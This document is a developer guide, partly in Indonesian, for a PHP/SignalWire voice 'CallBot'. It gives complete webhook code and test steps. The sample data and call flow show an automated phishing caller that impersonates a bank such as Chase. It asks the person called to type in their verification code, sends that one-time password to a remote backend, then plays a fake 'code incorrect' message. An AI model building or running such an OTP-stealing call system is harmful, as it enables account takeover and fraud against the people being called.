# PHP External Webhook Integration Guide

## 🎯 Overview

Sistem CallBot sekarang menggunakan **External PHP Webhooks** (ngrok) untuk handling voice calls. PHP webhooks harus membaca **EXACT text dari UI form** untuk TTS/voice messages.

---

## 🔗 Webhook URLs

**Base URL:** `https://piddly-tenable-frederic.ngrok-free.dev`

**Webhook Endpoints:**
1. `signalwire-webhook.php` - Main webhook (Step 1 message)
2. `signalwire-first-input.php` - Handle first digit (1 or 0)
3. `signalwire-deny.php` - Handle deny flow (Step 2 + OTP gathering)
4. `signalwire-accept.php` - Handle accept flow (Accepted message)
5. `signalwire-status.php` - Status callbacks
6. `signalwire-amd.php` - AMD detection (optional)

---

## 📡 Get Call Data API

**Endpoint:** `GET /api/webhooks/external/call/{call_id}`

**Response:**
```json
{
  "call_id": "abc123",
  "from_number": "+18882676520",
  "to_number": "+14089105678",
  "recipient_name": "John Doe",
  "service_name": "Chase Bank",
  "tts_voice": "Aurora",
  "language": "en-US",
  "digits": 6,
  "step_1_message": "Hi John Doe! I'm calling from Chase Bank...",
  "step_2_message": "Please enter your 6 digit verification code...",
  "step_3_message": "Verifying your code, please wait...",
  "accepted_message": "Thank you! Your account is secure.",
  "rejected_message": "Code incorrect. Try again with 6 digits.",
  "external_webhook_base": "https://piddly-tenable-frederic.ngrok-free.dev"
}
```

---

## 📝 PHP Webhook Implementation

### 1. signalwire-webhook.php (Main - Step 1)

```php
<?php
// Get call_id from URL parameter
$call_id = $_GET['call_id'] ?? '';

if (empty($call_id)) {
    die('<?xml version="1.0" encoding="UTF-8"?><Response><Say>Invalid call</Say><Hangup/></Response>');
}

// Fetch call data from API
$api_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
$call_data = json_decode(file_get_contents($api_url), true);

if (!$call_data) {
    die('<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call data not found</Say><Hangup/></Response>');
}

// Get EXACT text from UI form (NO hardcoded text!)
$voice = $call_data['tts_voice'] ?? 'Aurora';
$language = $call_data['language'] ?? 'en-US';
$step_1_message = $call_data['step_1_message'] ?? '';
$first_input_url = $call_data['external_webhook_base'] . "/signalwire-first-input.php?call_id={$call_id}";

// Generate TwiML with EXACT text from UI
header('Content-Type: application/xml');
echo '<?xml version="1.0" encoding="UTF-8"?>';
?>
<Response>
    <Gather numDigits="1" action="<?php echo $first_input_url; ?>" method="POST" timeout="10">
        <Say voice="<?php echo $voice; ?>" language="<?php echo $language; ?>"><?php echo htmlspecialchars($step_1_message); ?></Say>
    </Gather>
    <Say voice="<?php echo $voice; ?>">We did not receive any input. Goodbye.</Say>
    <Hangup/>
</Response>
```

### 2. signalwire-first-input.php

```php
<?php
$call_id = $_GET['call_id'] ?? '';
$digits = $_POST['Digits'] ?? '';

// Fetch call data
$api_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
$call_data = json_decode(file_get_contents($api_url), true);

$webhook_base = $call_data['external_webhook_base'];

header('Content-Type: application/xml');
echo '<?xml version="1.0" encoding="UTF-8"?>';

if ($digits == '1') {
    // User pressed 1 - Deny flow (gather OTP)
    echo "<Response><Redirect>{$webhook_base}/signalwire-deny.php?call_id={$call_id}</Redirect></Response>";
} elseif ($digits == '0') {
    // User pressed 0 - Accept flow
    echo "<Response><Redirect>{$webhook_base}/signalwire-accept.php?call_id={$call_id}</Redirect></Response>";
} else {
    // Invalid input
    $voice = $call_data['tts_voice'] ?? 'Aurora';
    echo "<Response><Say voice=\"{$voice}\">Invalid input. Please try again.</Say>";
    echo "<Redirect>{$webhook_base}/signalwire-webhook.php?call_id={$call_id}</Redirect></Response>";
}
?>
```

### 3. signalwire-deny.php (Step 2 + OTP)

```php
<?php
$call_id = $_GET['call_id'] ?? '';
$digits = $_POST['Digits'] ?? '';

// Fetch call data
$api_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
$call_data = json_decode(file_get_contents($api_url), true);

$voice = $call_data['tts_voice'] ?? 'Aurora';
$language = $call_data['language'] ?? 'en-US';
$digits_required = $call_data['digits'] ?? 6;
$webhook_base = $call_data['external_webhook_base'];

header('Content-Type: application/xml');
echo '<?xml version="1.0" encoding="UTF-8"?>';

if (!empty($digits) && strlen($digits) == $digits_required) {
    // OTP received - Play Step 3 + Rejected message (EXACT text from UI)
    $step_3_message = $call_data['step_3_message'] ?? '';
    $rejected_message = $call_data['rejected_message'] ?? '';
    
    // Send OTP to backend for logging
    $update_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
    $update_data = json_encode(['event' => 'otp_received', 'otp' => $digits, 'status' => 'otp_entered']);
    file_get_contents($update_url, false, stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => $update_data
        ]
    ]));
    
    ?>
<Response>
    <Say voice="<?php echo $voice; ?>" language="<?php echo $language; ?>"><?php echo htmlspecialchars($step_3_message); ?></Say>
    <Pause length="2"/>
    <Say voice="<?php echo $voice; ?>" language="<?php echo $language; ?>"><?php echo htmlspecialchars($rejected_message); ?></Say>
    <Hangup/>
</Response>
    <?php
} else {
    // First time - Ask for OTP using Step 2 message (EXACT text from UI)
    $step_2_message = $call_data['step_2_message'] ?? '';
    $gather_url = "{$webhook_base}/signalwire-deny.php?call_id={$call_id}";
    ?>
<Response>
    <Gather numDigits="<?php echo $digits_required; ?>" action="<?php echo $gather_url; ?>" method="POST" timeout="15">
        <Say voice="<?php echo $voice; ?>" language="<?php echo $language; ?>"><?php echo htmlspecialchars($step_2_message); ?></Say>
    </Gather>
    <Say voice="<?php echo $voice; ?>">We did not receive the code. Goodbye.</Say>
    <Hangup/>
</Response>
    <?php
}
?>
```

### 4. signalwire-accept.php (Accepted Message)

```php
<?php
$call_id = $_GET['call_id'] ?? '';

// Fetch call data
$api_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
$call_data = json_decode(file_get_contents($api_url), true);

$voice = $call_data['tts_voice'] ?? 'Aurora';
$language = $call_data['language'] ?? 'en-US';
$accepted_message = $call_data['accepted_message'] ?? '';

// Send event to backend
$update_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
$update_data = json_encode(['event' => 'call_accepted', 'status' => 'accepted']);
file_get_contents($update_url, false, stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => $update_data
    ]
]));

header('Content-Type: application/xml');
echo '<?xml version="1.0" encoding="UTF-8"?>';
?>
<Response>
    <Say voice="<?php echo $voice; ?>" language="<?php echo $language; ?>"><?php echo htmlspecialchars($accepted_message); ?></Say>
    <Hangup/>
</Response>
```

### 5. signalwire-status.php

```php
<?php
$call_id = $_GET['call_id'] ?? '';
$call_status = $_POST['CallStatus'] ?? '';
$recording_url = $_POST['RecordingUrl'] ?? '';

// Send status to backend
$update_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
$update_data = json_encode([
    'event' => "status_{$call_status}",
    'status' => strtolower($call_status),
    'recording_url' => $recording_url
]);

file_get_contents($update_url, false, stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => $update_data
    ]
]));

echo 'OK';
?>
```

---

## ✅ Key Points

### CRITICAL RULES:

1. **ALWAYS use EXACT text from API** - Never hardcode messages
2. **Use `htmlspecialchars()`** to escape XML special characters
3. **Include language parameter** in `<Say>` tag
4. **Send events back to backend** via `/api/webhooks/external/update/{call_id}`
5. **Handle empty messages** - Check if message is not empty before using

### Variable Replacement:

Backend already replaces variables before saving to Firestore:
- `{{name}}` → Replaced with recipient_name
- `{{service}}` → Replaced with service_name
- `{{digit}}` → Replaced with digits count

**PHP does NOT need to do variable replacement** - use text as-is from API.

---

## 🧪 Testing

### Test API Endpoint:

```bash
curl "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{call_id}"
```

### Expected Response:
All messages should contain EXACT text from UI form, with variables already replaced.

### Test Flow:
1. Make call from dashboard with custom messages
2. Answer call → Should hear Step 1 message (exact text)
3. Press 1 → Should hear Step 2 message (exact text)
4. Enter OTP → Should hear Step 3 + Rejected message (exact text)
5. Press 0 → Should hear Accepted message (exact text)

---

## 📞 SignalWire Configuration

When creating call, system uses these URLs:
```
Callback URL: https://piddly-tenable-frederic.ngrok-free.dev/signalwire-webhook.php?call_id={call_id}
Status Callback: https://piddly-tenable-frederic.ngrok-free.dev/signalwire-status.php?call_id={call_id}
```

SignalWire will call PHP webhooks → PHP fetches data from API → PHP generates TwiML with EXACT text.
